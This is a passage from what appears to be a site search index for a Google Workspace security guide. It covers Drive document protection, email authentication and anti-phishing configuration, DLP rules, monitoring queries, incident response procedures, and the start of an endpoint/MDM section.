sensitive financial data</p> </li> <li> <p>HR documents:</p> </li> <li>Create dedicated spaces with restricted access</li> <li>Implement strict DLP rules for PII and employee data</li> <li>Maintain separation between general and sensitive HR information</li> <li> <p>Regular access reviews for HR document repositories</p> </li> <li> <p>Intellectual property:</p> </li> <li>Implement classification for IP documents</li> <li>Restrict editing and downloading capabilities</li> <li>Consider digital rights management solutions</li> <li> <p>Monitor for unusual access or download patterns</p> </li> <li> <p>Customer data:</p> </li> <li>Apply strict data residency controls if required</li> <li>Implement access based on customer relationship roles</li> <li>Create DLP rules specific to customer data protection</li> <li>Regular compliance validation for customer data handling</li> </ul>"},{"location":"drive-document-security/#google-forms-security","title":"Google Forms Security","text":"<p>Secure forms used for data collection:</p> <ul> <li>Form access controls:</li> <li>Restrict form creation to authorized personnel</li> <li>Implement approval workflows for public forms</li> <li>Regular review of published forms</li> <li> <p>Control where form responses are stored</p> </li> <li> <p>Data collection safeguards:</p> </li> <li>Limit collection of sensitive information in forms</li> <li>Implement clear data handling notices</li> <li>Configure appropriate response visibility settings</li> <li> <p>Secure storage and retention of form responses</p> </li> <li> <p>Form response security:</p> </li> <li>Implement access controls for form response spreadsheets</li> <li>Regular review of response access permissions</li> <li>Secure transfer of responses to operational systems</li> <li>Appropriate retention and deletion of response data</li> </ul>"},{"location":"drive-document-security/#google-sheets-with-sensitive-data","title":"Google Sheets with Sensitive Data","text":"<p>Implement additional controls for spreadsheets containing sensitive information:</p> <ul> <li>Cell-level protection:</li> <li>Use protected ranges for sensitive data elements</li> <li>Implement sheet-level access restrictions</li> <li>Use data validation to prevent inappropriate modifications</li> <li> <p>Consider hidden sheets for sensitive calculation data</p> </li> <li> <p>Formula security:</p> </li> <li>Protect formulas containing business logic</li> <li>Implement version control for complex spreadsheets</li> <li>Document critical formulas and calculations</li> <li> <p>Regular validation of formula integrity</p> </li> <li> <p>External data connections:</p> </li> <li>Secure API connections from sheets to external systems</li> <li>Implement authentication for data import/export functions</li> <li>Regular review of data connection permissions</li> <li>Monitor for unauthorized modifications to data connections</li> </ul>"},{"location":"drive-document-security/#drive-security-monitoring-and-response","title":"Drive Security Monitoring and Response","text":""},{"location":"drive-document-security/#security-monitoring-framework","title":"Security Monitoring Framework","text":"<p>Implement comprehensive monitoring for Google Drive:</p> <ul> <li>Key monitoring metrics:</li> <li>External sharing volume and patterns</li> <li>Sensitive document access attempts</li> <li>Download and export activities</li> <li>Administrative changes to Drive settings</li> <li> <p>DLP rule triggers and violations</p> </li> <li> <p>Alert thresholds and triggers:</p> </li> <li>Unusual volume of document access or sharing</li> <li>After-hours access to sensitive content</li> <li>Bulk download or deletion operations</li> <li>Sensitive content moved to unsecured locations</li> <li> <p>DLP rule violations on critical data</p> </li> <li> <p>Monitoring implementation:</p> </li> <li>SIEM integration for Drive audit logs</li> <li>Custom dashboards for Drive security metrics</li> <li>Automated alerting for security events</li> <li>Regular review of security monitoring effectiveness</li> </ul>"},{"location":"drive-document-security/#drive-security-incidents","title":"Drive Security Incidents","text":"<p>Prepare for common security incidents:</p>"},{"location":"drive-document-security/#unauthorized-document-sharing","title":"Unauthorized Document Sharing","text":"<p>Response actions: 1. Identify scope of unauthorized sharing 2. Revoke inappropriate access permissions 3. Review document contents for sensitivity 4. Document incident details and business impact 5. Implement controls to prevent recurrence</p>"},{"location":"drive-document-security/#document-data-leakage","title":"Document Data Leakage","text":"<p>Response actions: 1. Identify affected documents and exposure scope 2. Assess sensitivity of exposed information 3. Implement containment measures where possible 4. Determine notification requirements if applicable 5. Document incident details and implement preventive controls</p>"},{"location":"drive-document-security/#suspicious-document-access","title":"Suspicious Document Access","text":"<p>Response actions: 1. Preserve access logs for investigation 2. Review nature and sensitivity of accessed documents 3. Analyze access patterns for malicious intent 4. Interview document owner regarding legitimacy 5. Implement additional monitoring or access restrictions</p>"},{"location":"drive-document-security/#msp-specific-drive-security","title":"MSP-Specific Drive Security","text":"<p>For MSPs managing multiple Google Workspace tenants:</p> <ul> <li>Cross-tenant security standards:</li> <li>Consistent Drive security baselines across clients</li> <li>Standardized DLP implementations with client customization</li> <li>Unified external sharing policies where appropriate</li> <li> <p>Common document classification frameworks</p> </li> <li> <p>Client segmentation model:</p> </li> <li>Tiered security offerings based on client requirements</li> <li>Risk-based implementation of security controls</li> <li>Custom monitoring based on client data sensitivity</li> <li> <p>Differentiated response procedures by client tier</p> </li> <li> <p>Multi-tenant monitoring:</p> </li> <li>Consolidated security dashboards across tenants</li> <li>Prioritized alerting based on client tier and event severity</li> <li>Cross-client threat intelligence sharing</li> <li>Efficient security resource allocation</li> </ul>"},{"location":"drive-document-security/#implementation-checklist","title":"Implementation Checklist","text":"<ul> <li> Configure organization-level Drive sharing restrictions</li> <li> Implement appropriate link sharing defaults</li> <li> Set up DLP rules for sensitive document protection</li> <li> Configure Shared Drive creation and security settings</li> <li> Enable comprehensive audit logging</li> <li> Implement document classification framework</li> <li> Create secure external sharing procedures</li> <li> Set up security monitoring and alerting</li> <li> Develop incident response procedures for Drive security events</li> <li> Create user training for secure document handling</li> <li> Implement regular security reviews of Drive content and sharing</li> <li> Deploy specialized controls for high-sensitivity document types</li> </ul>"},{"location":"drive-document-security/#resources","title":"Resources","text":"<ul> <li>Google Drive Security Best Practices</li> <li>Google Workspace DLP Documentation</li> <li>Information Rights Management</li> <li>Google Workspace Audit Logs</li> <li>Shared Drive Security</li> </ul> <p>Note: This guide should be adapted to your organization's specific needs and risk profile.</p>"},{"location":"email-security/","title":"Email Security","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"email-security/#google-workspace-email-security-guide","title":"Google Workspace Email Security Guide","text":"<p>This comprehensive guide provides security professionals and MSPs with detailed strategies for securing Google Workspace email environments, with a focus on advanced threat detection, policy implementation, and monitoring.</p>"},{"location":"email-security/#email-security-architecture-in-google-workspace","title":"Email Security Architecture in Google Workspace","text":""},{"location":"email-security/#understanding-gmails-security-layers","title":"Understanding Gmail's Security Layers","text":"<p>Gmail's security architecture consists of multiple defensive layers that work together to provide comprehensive protection:</p> <ol> <li>Connection Security</li> <li>TLS encryption for mail transfer</li> <li>SMTP security enforcement</li> <li> <p>Certificate validation</p> </li> <li> <p>Identity and Authentication</p> </li> <li>SPF, DKIM, and DMARC validation</li> <li>Sender reputation assessment</li> <li> <p>Authentication results verification</p> </li> <li> <p>Content Security</p> </li> <li>Spam filtering algorithms</li> <li>Malware detection engines</li> <li>Phishing protection</li> <li> <p>Attachment scanning</p> </li> <li> <p>User Security</p> </li> <li>Suspicious login detection</li> <li>Security alert notifications</li> <li>Safe browsing warnings</li> <li> <p>External sender indicators</p> </li> <li> <p>Data Protection</p> </li> <li>Data Loss Prevention (DLP)</li> <li>Content compliance rules</li> <li>Confidential mode</li> <li>Rights management</li> </ol>"},{"location":"email-security/#gmail-security-vs-traditional-secure-email-gateways","title":"Gmail Security vs. Traditional Secure Email Gateways","text":"<p>Unlike traditional SEGs which sit in front of mail systems, Gmail's security is deeply integrated into the platform. Key differences include:</p> Characteristic Traditional SEG Gmail Security Architecture Separate product, often on-premises or cloud proxy Natively integrated into Gmail platform Deployment Requires MX record changes, mail routing configuration Built-in, no additional deployment required Updates Scheduled updates, often requiring maintenance windows Continuous updates without disruption Intelligence Based on vendor threat intelligence and signatures Machine learning with real-time global threat data Scalability Often requires capacity planning and scaling Automatically scales with Google infrastructure User Experience May introduce latency, quarantine management Seamless experience with minimal user interaction"},{"location":"email-security/#implementing-comprehensive-email-security","title":"Implementing Comprehensive Email Security","text":""},{"location":"email-security/#1-core-email-authentication-configuration","title":"1. Core Email Authentication Configuration","text":"<p>Properly configured email authentication is fundamental to preventing spoofing and phishing:</p>"},{"location":"email-security/#spf-sender-policy-framework-implementation","title":"SPF (Sender Policy Framework) Implementation","text":"<pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Authentication\n- Add SPF records to your DNS with appropriate scope\n</code></pre> <p>Example SPF Record: <pre><code>v=spf1 include:_spf.google.com ~all\n</code></pre></p> <p>Implementation Considerations: - Use <code>~all</code> (soft fail) initially to monitor impact - Transition to <code>-all</code> (hard fail) after validation period - Include all legitimate sending sources - Stay under the 10 DNS lookup limit</p>"},{"location":"email-security/#dkim-domainkeys-identified-mail-configuration","title":"DKIM (DomainKeys Identified Mail) Configuration","text":"<pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Authentication\n- Generate DKIM key for your domain\n- Add DKIM keys to DNS\n- Enable DKIM signing\n</code></pre> <p>Best Practices: - Use 2048-bit keys for stronger security - Implement DKIM for all domains, including subdomains - Rotate keys annually as a security best practice - Monitor DKIM signature validation rates</p>"},{"location":"email-security/#dmarc-domain-based-message-authentication-reporting-conformance-setup","title":"DMARC (Domain-based Message Authentication, Reporting &amp; Conformance) Setup","text":"<pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Authentication\n- Configure DMARC policy through DNS records\n</code></pre> <p>Example DMARC Record: <pre><code>v=DMARC1; p=quarantine; pct=100; rua=mailto:dmarc-reports@example.com\n</code></pre></p> <p>Progressive Implementation Strategy: 1. Start with monitoring policy (<code>p=none</code>) 2. Analyze reports to identify legitimate sources 3. Move to quarantine policy (<code>p=quarantine</code>) with percentage (<code>pct=</code>) 4. Progress to rejection policy (<code>p=reject</code>) when ready</p> <p>Reporting Configuration: - Set up dedicated mailbox for aggregate reports (<code>rua=</code>) - Consider using a DMARC analysis service - Review reports weekly during implementation - Monitor for unauthorized senders</p>"},{"location":"email-security/#2-enhanced-anti-phishing-protection","title":"2. Enhanced Anti-Phishing Protection","text":"<p>Implement advanced controls to protect against sophisticated phishing:</p>"},{"location":"email-security/#suspicious-link-protection","title":"Suspicious Link Protection","text":"<pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Safety\n- Configure URL link protection settings\n- Enable \"Protect against inbound emails that contain suspicious links\"\n- Enable \"Scan images sent as attachments\"\n</code></pre> <p>Protection Options: - Warning prompt: Display warning before user visits suspicious links - Link modification: Rewrite links to pass through Google Safe Browsing - Link click tracking: Record suspicious link interactions for security review</p>"},{"location":"email-security/#external-sender-warnings","title":"External Sender Warnings","text":"<pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Safety\n- Enable \"Show a warning for unauthenticated emails\"\n- Configure \"Automatically identify emails from outside your organization\"\n</code></pre> <p>Implementation Considerations: - Create custom warning banners for external emails - Implement additional warnings for first-time senders - Configure special warnings for lookalike domain names - Consider warning levels based on sender risk score</p>"},{"location":"email-security/#advanced-phishing-and-malware-protection","title":"Advanced Phishing and Malware Protection","text":"<pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Safety\n- Enable \"Protect against anomalous attachment types\"\n- Configure \"Protect against emails with unusual attachment types\"\n- Set \"Protect against encrypted attachments that Google can't scan\" as appropriate\n- Enable \"Protect against domain spoofing based on similar domain names\"\n- Enable \"Protect against spoofing of employee names\"\n</code></pre> <p>Key Controls: - Implement attachment type restrictions - Configure enhanced pre-delivery message scanning - Enable encrypted attachment protection - Activate employee impersonation protection - Configure domain spoofing detection</p>"},{"location":"email-security/#3-data-loss-prevention-implementation","title":"3. Data Loss Prevention Implementation","text":"<p>Protect sensitive information from unauthorized email transmission:</p>"},{"location":"email-security/#content-compliance-rules","title":"Content Compliance Rules","text":"<pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Compliance\n- Configure content compliance rules\n- Set up custom content matchers\n- Define appropriate actions\n</code></pre> <p>Example Rule Configurations:</p> <p>Credit Card Rule: - Trigger: Messages containing credit card numbers - Action: Quarantine or add warning - Pattern: Regular expression for credit card formats - Scope: Outbound email to external recipients</p> <p>Medical Information Rule: - Trigger: Messages containing PHI/health identifiers - Action: Apply confidential mode or require approval - Pattern: Dictionary of medical terms + identifiers - Scope: All email messages</p>"},{"location":"email-security/#dlp-policy-implementation-strategy","title":"DLP Policy Implementation Strategy","text":"<p>Staged Approach: 1. Discovery Mode: Identify data patterns without enforcement 2. Advisory Mode: Warn users about sensitive content 3. Enforcement Mode: Block or modify non-compliant messages</p> <p>Policy Components: - Content Detectors: Regular expressions, dictionaries, fingerprints - Contextual Rules: Recipient, sender, time-based conditions - Actions: Block, quarantine, modify, warn, log - Exceptions: Legitimate business cases requiring special handling</p>"},{"location":"email-security/#confidential-mode-configuration","title":"Confidential Mode Configuration","text":"<pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Confidential Mode\n- Configure \"Allow users to send confidential emails\"\n- Set appropriate defaults for expiration and access controls\n</code></pre> <p>Key Features to Configure: - Message expiration timeframes - SMS verification requirements - Ability to revoke access - Prevent downloading, printing, or forwarding</p>"},{"location":"email-security/#4-advanced-routing-and-security-rules","title":"4. Advanced Routing and Security Rules","text":"<p>Implement sophisticated mail flow rules to enhance security:</p>"},{"location":"email-security/#inbound-security-rules","title":"Inbound Security Rules","text":"<pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Routing\n- Configure inbound security rules based on sender attributes\n- Set up content-based routing policies\n</code></pre> <p>Example Inbound Rules:</p> <p>External PDF Scanning: <pre><code>IF:\n- Sender: External\n- Attachment: PDF files\nTHEN:\n- Add X-header: X-PDF-Scanned\n- Apply additional malware scanning\n- Modify subject: [PDF ATTACHMENT]\n</code></pre></p> <p>Lookalike Domain Alert: <pre><code>IF:\n- Sender domain: Similar to your domain (regex pattern)\n- Not authenticated via DKIM/SPF\nTHEN:\n- Add warning banner\n- Route to suspicious email folder\n- Generate security alert\n</code></pre></p>"},{"location":"email-security/#outbound-security-controls","title":"Outbound Security Controls","text":"<pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Routing\n- Configure outbound mail policies\n- Set up data security rules for external communication\n</code></pre> <p>Example Outbound Rules:</p> <p>Partner Domain Routing: <pre><code>IF:\n- Recipient domain: Trusted partner domains\n- Contains attachments\nTHEN:\n- Apply TLS enforcement\n- Add footer with data classification\n- Allow higher attachment size limits\n</code></pre></p> <p>High-Risk Destination Control: <pre><code>IF:\n- Recipient country: High-risk locations\n- Contains attachments or links\nTHEN:\n- Require additional verification\n- Apply stricter content analysis\n- Enforce longer message hold for review\n</code></pre></p>"},{"location":"email-security/#5-user-and-group-based-security-policies","title":"5. User and Group-Based Security Policies","text":"<p>Implement targeted security controls based on user roles and requirements:</p>"},{"location":"email-security/#role-based-email-policies","title":"Role-Based Email Policies","text":"<p>Configure policies for specific user groups:</p> <p>Finance Team Policy: <pre><code>Admin Console &gt; Groups &gt; Create new group &gt; Finance Users\n- Apply enhanced security features:\n  - Mandatory encryption for external emails\n  - Stricter attachment controls\n  - Advanced phishing protection\n  - Enhanced logging\n</code></pre></p> <p>Executive Protection Policy: <pre><code>Admin Console &gt; Groups &gt; Create new group &gt; Executive Users\n- Apply enhanced security features:\n  - Impersonation protection\n  - Display name monitoring\n  - Stricter external sender warnings\n  - Enhanced phishing protection\n</code></pre></p>"},{"location":"email-security/#organizational-unit-email-security","title":"Organizational Unit Email Security","text":"<p>Implement differential email security by OU:</p> <pre><code>Admin Console &gt; Directory &gt; Organizational Units\n- Create security-focused OUs\n- Apply appropriate email security controls per OU\n</code></pre> <p>Implementation Strategy: - Group users with similar security profiles - Create graduated security tiers (Standard, Enhanced, High Security) - Align email security with data sensitivity and user role - Document exception processes for cross-OU needs</p>"},{"location":"email-security/#security-monitoring-and-incident-response","title":"Security Monitoring and Incident Response","text":""},{"location":"email-security/#1-email-security-monitoring-framework","title":"1. Email Security Monitoring Framework","text":"<p>Implement comprehensive monitoring to detect email-based threats:</p>"},{"location":"email-security/#key-monitoring-metrics","title":"Key Monitoring Metrics","text":"Metric Category Key Indicators Monitoring Frequency Authentication SPF/DKIM/DMARC failure rates, authentication bypass attempts Daily Phishing Reported phishing, click-through rates on suspicious links Daily Malware Attachment blocks, malicious content detection Daily Data Loss DLP rule triggers, confidential mode usage Weekly User Behavior Unusual sending patterns, rule modifications, forwarding changes Weekly System Health Mail flow delays, quarantine size, processing issues Daily"},{"location":"email-security/#email-log-analysis","title":"Email Log Analysis","text":"<pre><code>Admin Console &gt; Reports &gt; Audit &gt; Email Log Search\n- Set up regular review of email security logs\n- Configure custom log queries for specific threats\n</code></pre> <p>Sample Monitoring Queries:</p> <p>Authentication Failure Monitoring: <pre><code>-- Pseudocode for email authentication monitoring\nSELECT sender_domain, count(*) as failure_count,\n       dkim_result, spf_result, dmarc_result\nFROM email_logs\nWHERE timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND (dkim_result = 'fail' OR spf_result = 'fail' OR dmarc_result = 'fail')\n  AND recipient_domain = 'yourdomain.com'\nGROUP BY sender_domain, dkim_result, spf_result, dmarc_result\nORDER BY failure_count DESC\nLIMIT 100\n</code></pre></p> <p>Suspicious Email Pattern Detection: <pre><code>-- Pseudocode for suspicious email patterns\nSELECT sender_email, subject, count(*) as email_count,\n       MIN(timestamp) as first_seen, MAX(timestamp) as last_seen\nFROM email_logs\nWHERE timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)\n  AND recipient_domain = 'yourdomain.com'\n  AND (\n    subject LIKE '%urgent%' OR\n    subject LIKE '%password%' OR\n    subject LIKE '%verify%' OR\n    subject LIKE '%account%access%'\n  )\n  AND authentication_summary NOT LIKE '%PASS%'\nGROUP BY sender_email, subject\nHAVING email_count &gt; 5\nORDER BY email_count DESC\n</code></pre></p>"},{"location":"email-security/#2-email-incident-response-procedures","title":"2. Email Incident Response Procedures","text":"<p>Develop structured response procedures for email security incidents:</p>"},{"location":"email-security/#phishing-attack-response","title":"Phishing Attack Response","text":"<p>Initial Assessment: 1. Identify affected users and message characteristics 2. Determine if credentials were compromised 3. Assess if malware was delivered 4. Identify similar messages in mail flow</p> <p>Containment Steps: 1. Remove phishing emails from affected inboxes 2. Block sender domains/addresses 3. Update content filters to catch similar messages 4. Reset passwords for affected users if credentials compromised</p> <p>Eradication Actions: 1. Deploy additional scanning for related threats 2. Update phishing protection rules 3. Enhance security awareness for targeted users 4. Implement additional verification if necessary</p> <p>Recovery Process: 1. Restore access to legitimate services 2. Monitor for further attempts 3. Implement additional security controls 4. Document incident and update security posture</p>"},{"location":"email-security/#business-email-compromise-response","title":"Business Email Compromise Response","text":"<p>Initial Assessment: 1. Confirm account compromise indicators 2. Determine account access timeline 3. Identify actions taken by attackers 4. Assess financial or data loss impact</p> <p>Containment Steps: 1. Reset account credentials 2. Enable additional authentication factors 3. Review and remove suspicious rules or delegates 4. Block external forwarding temporarily</p> <p>Eradication Actions: 1. Scan for persistence mechanisms (mail rules, delegates) 2. Identify and remediate any related compromises 3. Implement enhanced monitoring for affected accounts 4. Review authentication patterns for anomalies</p> <p>Recovery Process: 1. Restore proper account configuration 2. Implement additional security controls 3. Enhanced monitoring of victim accounts 4. Conduct user security training</p>"},{"location":"email-security/#3-security-testing-and-simulation","title":"3. Security Testing and Simulation","text":"<p>Implement proactive security testing for email defenses:</p>"},{"location":"email-security/#phishing-simulation-program","title":"Phishing Simulation Program","text":"<p>Develop an ongoing phishing simulation program:</p> <ol> <li>Assessment Phase</li> <li>Establish baseline phishing susceptibility</li> <li>Identify high-risk user groups</li> <li> <p>Define success metrics</p> </li> <li> <p>Implementation Phase</p> </li> <li>Create graduated difficulty levels</li> <li>Design realistic scenarios based on actual threats</li> <li> <p>Implement automated reporting and tracking</p> </li> <li> <p>Education Integration</p> </li> <li>Provide immediate education for users who fail tests</li> <li>Create targeted training based on simulation results</li> <li> <p>Track improvement over time</p> </li> <li> <p>Continuous Improvement</p> </li> <li>Analyze results to improve security controls</li> <li>Update simulations based on current threat landscape</li> <li>Report metrics to leadership</li> </ol>"},{"location":"email-security/#security-control-validation","title":"Security Control Validation","text":"<p>Regularly test email security controls:</p> <ol> <li>Authentication Testing</li> <li>Verify SPF, DKIM, and DMARC enforcement</li> <li>Test sender verification mechanisms</li> <li> <p>Validate domain spoofing protection</p> </li> <li> <p>Content Filtering Validation</p> </li> <li>Test malware detection using EICAR test files</li> <li>Validate phishing URL detection</li> <li> <p>Verify attachment scanning effectiveness</p> </li> <li> <p>DLP Rule Testing</p> </li> <li>Verify sensitive data detection patterns</li> <li>Test boundary conditions for rules</li> <li> <p>Validate exception handling</p> </li> <li> <p>User Protection Testing</p> </li> <li>Verify external sender warnings</li> <li>Test suspicious link warnings</li> <li>Validate security notifications</li> </ol>"},{"location":"email-security/#advanced-email-security-topics","title":"Advanced Email Security Topics","text":""},{"location":"email-security/#1-zero-trust-email-security-model","title":"1. Zero Trust Email Security Model","text":"<p>Implement a comprehensive Zero Trust approach to email security:</p> <p>Core Principles: 1. Verify Explicitly: Authentication and verification for all senders 2. Least Privilege Access: Minimum necessary email functionality 3. Assume Breach: Continuous monitoring and verification</p> <p>Implementation Approach:</p> <ol> <li>Identity Verification Layer</li> <li>Enforce strong authentication for senders</li> <li>Implement multiple validation signals</li> <li> <p>Create sender trust scoring</p> </li> <li> <p>Content Trust Layer</p> </li> <li>Treat all content as potentially malicious</li> <li>Implement multiple scanning engines</li> <li> <p>Use sandboxing for suspicious content</p> </li> <li> <p>Access Control Layer</p> </li> <li>Apply conditional access to email</li> <li>Implement device trust requirements</li> <li> <p>Enforce encryption for sensitive content</p> </li> <li> <p>Continuous Monitoring Layer</p> </li> <li>Monitor behavior patterns</li> <li>Apply adaptive controls</li> <li>Implement real-time risk assessment</li> </ol>"},{"location":"email-security/#2-integration-with-security-ecosystem","title":"2. Integration with Security Ecosystem","text":"<p>Leverage integrations with broader security infrastructure:</p>"},{"location":"email-security/#siem-integration","title":"SIEM Integration","text":"<p>Implement integration with Security Information and Event Management systems:</p> <pre><code>Admin Console &gt; Security &gt; Alert Center &gt; Alert notifications\n- Configure email security log export\n- Set up API integration for alert data\n- Implement correlation rules in SIEM\n</code></pre> <p>Key Integration Points: - Email authentication failure events - Phishing and malware detection alerts - DLP rule triggers - Authentication anomalies - Admin configuration changes</p>"},{"location":"email-security/#threat-intelligence-integration","title":"Threat Intelligence Integration","text":"<p>Leverage threat intelligence to enhance email security:</p> <ol> <li>External Threat Feeds</li> <li>Implement integration with threat intelligence platforms</li> <li>Subscribe to email-specific threat feeds</li> <li> <p>Create automation for indicator ingestion</p> </li> <li> <p>Custom Indicators</p> </li> <li>Develop process for custom IOC creation</li> <li>Implement feedback loop from incident response</li> <li> <p>Create regular review and cleanup process</p> </li> <li> <p>Automated Response</p> </li> <li>Create playbooks for common threat types</li> <li>Implement automated remediation for known threats</li> <li>Develop escalation procedures for novel threats</li> </ol>"},{"location":"email-security/#3-email-security-analytics","title":"3. Email Security Analytics","text":"<p>Implement advanced analytics to enhance detection capabilities:</p>"},{"location":"email-security/#user-behavior-analytics","title":"User Behavior Analytics","text":"<p>Monitor email usage patterns to detect anomalies:</p> <ol> <li>Baseline Development</li> <li>Establish normal sending patterns per user</li> <li>Document typical external communication</li> <li> <p>Map expected attachment and link usage</p> </li> <li> <p>Anomaly Detection</p> </li> <li>Identify deviations from normal patterns</li> <li>Alert on unusual recipient combinations</li> <li> <p>Detect changes in email frequency or timing</p> </li> <li> <p>Contextual Analysis</p> </li> <li>Correlate email behavior with other activities</li> <li>Implement risk scoring based on multiple factors</li> <li>Apply machine learning for pattern recognition</li> </ol>"},{"location":"email-security/#advanced-threat-analytics","title":"Advanced Threat Analytics","text":"<p>Implement sophisticated analytics for threat detection:</p> <ol> <li>Content Analysis</li> <li>Deploy natural language processing for phishing detection</li> <li>Implement imagery analysis for brand impersonation</li> <li> <p>Use machine learning to identify suspicious language patterns</p> </li> <li> <p>Relationship Mapping</p> </li> <li>Create sender-recipient relationship graphs</li> <li>Identify unusual communication patterns</li> <li> <p>Detect potential business email compromise attempts</p> </li> <li> <p>Temporal Analytics</p> </li> <li>Analyze timing of email campaigns</li> <li>Identify coordinated attack patterns</li> <li>Detect low-and-slow attack methodologies</li> </ol>"},{"location":"email-security/#msp-specific-email-security-strategies","title":"MSP-Specific Email Security Strategies","text":""},{"location":"email-security/#multi-tenant-email-security-management","title":"Multi-Tenant Email Security Management","text":"<p>Implement efficient security management across client environments:</p> <ol> <li>Standardized Baseline</li> <li>Create tiered security baselines by client type</li> <li>Implement consistent naming conventions</li> <li> <p>Develop standardized configuration templates</p> </li> <li> <p>Cross-Tenant Monitoring</p> </li> <li>Implement consolidated security monitoring</li> <li>Create unified alert management</li> <li> <p>Develop cross-client threat detection</p> </li> <li> <p>Delegated Administration</p> </li> <li>Configure appropriate client admin access</li> <li>Create clear security responsibility matrix</li> <li>Implement workflow for security change requests</li> </ol>"},{"location":"email-security/#client-specific-customization","title":"Client-Specific Customization","text":"<p>Balance standardization with client-specific needs:</p> <ol> <li>Security Policy Adaptation</li> <li>Create process for client-specific policy variations</li> <li>Document exceptions with justification</li> <li> <p>Implement regular review process</p> </li> <li> <p>Custom Integration Support</p> </li> <li>Develop procedures for client-specific integrations</li> <li>Create security review process for integrations</li> <li> <p>Implement monitoring for integration-specific risks</p> </li> <li> <p>Compliance Variation Management</p> </li> <li>Map specific compliance requirements by client</li> <li>Create validation mechanisms for compliance controls</li> <li>Implement documented exception processes</li> </ol>"},{"location":"email-security/#implementation-checklist","title":"Implementation Checklist","text":""},{"location":"email-security/#initial-email-security-setup","title":"Initial Email Security Setup","text":"<ul> <li> Configure SPF, DKIM, and DMARC authentication</li> <li> Implement enhanced phishing and malware protection</li> <li> Configure external sender and domain spoofing protection</li> <li> Set up basic content compliance and DLP rules</li> <li> Implement confidential mode configuration</li> <li> Configure email routing and security rules</li> <li> Establish baseline monitoring and alerting</li> </ul>"},{"location":"email-security/#advanced-security-enhancement","title":"Advanced Security Enhancement","text":"<ul> <li> Implement role-based email security policies</li> <li> Configure advanced DLP rules for sensitive data</li> <li> Deploy sophisticated attachment controls</li> <li> Implement Zero Trust email security model</li> <li> Configure SIEM and threat intelligence integration</li> <li> Establish user behavior analytics</li> <li> Develop security testing and simulation program</li> </ul>"},{"location":"email-security/#ongoing-maintenance","title":"Ongoing Maintenance","text":"<ul> <li> Weekly review of email security metrics</li> <li> Monthly testing of security controls</li> <li> Quarterly phishing simulations</li> <li> Bi-annual security policy review</li> <li> Annual comprehensive email security assessment</li> </ul>"},{"location":"email-security/#resources","title":"Resources","text":"<ul> <li>Google Workspace Email Security Best Practices</li> <li>Gmail Security Checklist</li> <li>Google Workspace Admin Help: Email Security</li> <li>DMARC.org Implementation Guide</li> <li>NIST Email Security Guidelines</li> </ul> <p>Note: This guide should be adapted to your organization's specific requirements, risk profile, and compliance needs.</p>"},{"location":"endpoint-security/","title":"Endpoint Security","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"endpoint-security/#google-workspace-endpoint-and-mobile-device-security-guide","title":"Google Workspace Endpoint and Mobile Device Security Guide","text":"<p>This comprehensive guide provides security professionals and MSPs with detailed strategies for implementing robust endpoint and mobile device security in Google Workspace environments.</p>"},{"location":"endpoint-security/#understanding-google-workspace-endpoint-security-architecture","title":"Understanding Google Workspace Endpoint Security Architecture","text":"<p>Google Workspace offers multiple layers of endpoint security that can be leveraged to create a comprehensive security posture:</p>"},{"location":"endpoint-security/#endpoint-security-components","title":"Endpoint Security Components","text":"<ol> <li>Mobile Device Management (MDM)</li> <li>Native Google Workspace MDM capabilities</li> <li>Basic vs. Advanced management options</li> <li> <p>iOS, Android, and Chrome OS capabilities</p> </li> <li> <p>Endpoint Verification</p> </li> <li>Device security posture assessment</li> <li>Chrome extension-based telemetry</li> <li> <p>Integration with access policies</p> </li> <li> <p>Third-Party Integrations</p> </li> <li>Unified Endpoint Management (UEM) partnerships</li> <li>Mobile Threat Defense (MTD) integration</li> <li> <p>Security information sharing capabilities</p> </li> <li> <p>Chrome Enterprise Controls</p> </li> <li>Chrome browser policies</li> <li>Chrome OS management</li> <li> <p>Extension deployment and control</p> </li> <li> <p>Context-Aware Access</p> </li> <li>Device-based access controls</li> <li>Integration of device state with access decisions</li> <li>Zero Trust implementation framework</li> <li>Conditional access based on device security posture</li> <li>See Google's official Context-Aware Access guide for detailed implementation</li> </ol>"},{"location":"endpoint-security/#mobile-device-management-implementation","title":"Mobile Device Management Implementation","text":""},{"location":"endpoint-security/#comprehensive-mdm-strategy","title":"Comprehensive MDM Strategy","text":"<p>When implementing MDM in Google Workspace, consider a strategic approach based on device ownership and security requirements:</p>"},{"location":"endpoint-security/#device-ownership-models","title":"Device Ownership Models","text":"Ownership Model Description Best Practices Corporate-Owned, Fully Managed Organization owns and fully controls devices Use Advanced Management, enforce strict policies, automatic enrollment Corporate-Owned, Personal Enabled (COPE) Organization owns devices but allows personal use Balance security with usability, separate work/personal profiles Bring Your Own Device (BYOD) Employee-owned devices accessing work resources Work profile separation, minimal personal restrictions, privacy focus Choose Your Own Device (CYOD) Employee selects from approved device list Standardized security baseline, consistent policy enforcement"},{"location":"endpoint-security/#management-level-selection","title":"Management Level Selection","text":"<p>Google Workspace offers different levels of device management:</p> <p>Basic Management: - Account-level control - Remote wipe of Google accounts - Simple password policies - Limited enforcement capabilities</p> <p>Advanced Management (Android/iOS): - Full device management - Comprehensive policy enforcement - App management - Enhanced security controls</p> <p>Chrome OS Management: - Comprehensive Chrome OS device policies - Forced enrollment via enterprise domains - Advanced security and usage controls - Extensive reporting capabilities</p>"},{"location":"endpoint-security/#mdm-implementation-workflow","title":"MDM Implementation Workflow","text":"<p>Follow this structured approach to implement MDM:</p> <ol> <li>Planning and Assessment</li> <li>Inventory existing devices</li> <li>Determine ownership models</li> <li>Define security requirements by user group</li> <li> <p>Create device categories and policies</p> </li> 